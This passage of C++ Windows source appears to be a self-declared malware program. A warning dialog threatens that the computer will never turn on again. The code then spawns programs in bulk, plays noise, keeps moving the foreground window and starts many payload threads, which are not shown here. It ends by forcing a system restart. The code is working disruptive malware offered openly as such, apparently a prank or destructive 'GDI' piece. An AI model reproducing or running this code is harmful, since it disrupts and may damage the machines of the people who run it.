	system("start tree.com");
	Sleep(1000);
	system("start taskmgr.exe");
	Sleep(1000);
	system("start verifier.exe");
	Sleep(1000);
	system("start winhelp.hlp");
	Sleep(1000);
	system("start winchat.exe");
	Sleep(1000);
	system("start winmine.exe");
	Sleep(1000);
	system("start wmimgmt.msc");
	Sleep(1000);
	system("start write.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	system("start winver.exe");
	Sleep(1000);
	return 0;
}

void sound1()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[10000 * 8] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t >> 10 ^ t) + 23 * t << 3 | 5) +
			((((t >> 12) & 70) >> t) * 12) + ((t << 56 * 12) & 123) +
			((123 ^ 34 * t < 12343) > t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void sound2()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[10000 * 9] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((((2 << t * 90) & 56) * t) * ((t >> 10) ^ 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI shakingWind(LPVOID lpcd)
{
	int x = 0;
	int y = 0;
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	HWND hwnd = GetForegroundWindow();
	while (true) {
		hwnd = GetForegroundWindow();

		x += incrementor * signX;
		y += incrementor * signY;
		
		SetWindowPos(hwnd, nullptr, x, y, x, y, SWP_NOSIZE);
		
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
	}
}

int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(d), int(c))
{	
	int message = MessageBox(NULL, L"Warning! If you are reading this message then you have the choice to stay with your computer with or without it if you click Yes in this dialog box then you will never turn on your computer again If you click no then you will live happily ever after with it", L"WARNING! This is malware!", MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL);
	switch (message)
	{
	case IDNO:
	{
		exit(0);
	}
	}
	CreateThread(0, 0, shakingWind, 0, 0, 0);
	sound1();
	CreateThread(0, 0, sub_18, 0, 0, 0);
	CreateThread(0, 0, sub_19, 0, 0, 0);
	HANDLE Sub01;
	Sub01 = CreateThread(0, 0, sub_1, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub01, NULL);
	CloseHandle(Sub01);
	HANDLE Sub02;
	Sub02 = CreateThread(0, 0, sub_2, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub02, NULL);
	CloseHandle(Sub02);
	CreateThread(0, 0, sub_12, 0, 0, 0);
	HANDLE Sub03;
	Sub03 = CreateThread(0, 0, sub_3, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub03, NULL);
	CloseHandle(Sub03);
	HANDLE Sub04;
	Sub04 = CreateThread(0, 0, sub_4, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub04, NULL);
	CloseHandle(Sub04);
	HANDLE Sub05;
	Sub05 = CreateThread(0, 0, sub_5, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub05, NULL);
	CloseHandle(Sub05);
	HANDLE Sub06;
	Sub06 = CreateThread(0, 0, sub_6, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub06, NULL);
	CloseHandle(Sub06);
	HANDLE Sub07;
	Sub07 = CreateThread(0, 0, sub_7, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub07, NULL);
	CloseHandle(Sub07);
	HANDLE Sub08;
	Sub08 = CreateThread(0, 0, sub_8, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub08, NULL);
	CloseHandle(Sub08);
	sound2();
	HANDLE Sub09;
	Sub09 = CreateThread(0, 0, sub_9, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub09, NULL);
	CloseHandle(Sub09);
	HANDLE Sub10;
	Sub10 = CreateThread(0, 0, sub_10, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub10, NULL);
	CloseHandle(Sub10);
	HANDLE Sub11;
	Sub11 = CreateThread(0, 0, sub_11, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub11, NULL);
	CloseHandle(Sub11);
	HANDLE Sub14;
	Sub14 = CreateThread(0, 0, sub_14, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub14, NULL);
	CloseHandle(Sub14);
	HANDLE Sub15;
	Sub15 = CreateThread(0, 0, sub_15, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub15, NULL);
	CloseHandle(Sub15);
	HANDLE Sub16;
	Sub16 = CreateThread(0, 0, sub_16, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub16, NULL);
	CloseHandle(Sub16);
	HANDLE Sub17;
	Sub17 = CreateThread(0, 0, sub_17, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub17, NULL);
	CloseHandle(Sub17);
	HANDLE Sub20;
	Sub20 = CreateThread(0, 0, sub_20, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub20, NULL);
	CloseHandle(Sub20);
	HANDLE Sub00;
	HANDLE Sub000;
	HANDLE Sub0000;
	Sub0000 = CreateThread(0, 0, MSGBX1, 0, 0, 0);
	Sub000 = CreateThread(0, 0, MSGBX2, 0, 0, 0);
	Sub00 = CreateThread(0, 0, MSGBX, 0, 0, 0);
	Sleep(30000);
	system("shutdown /r /t 60");
}
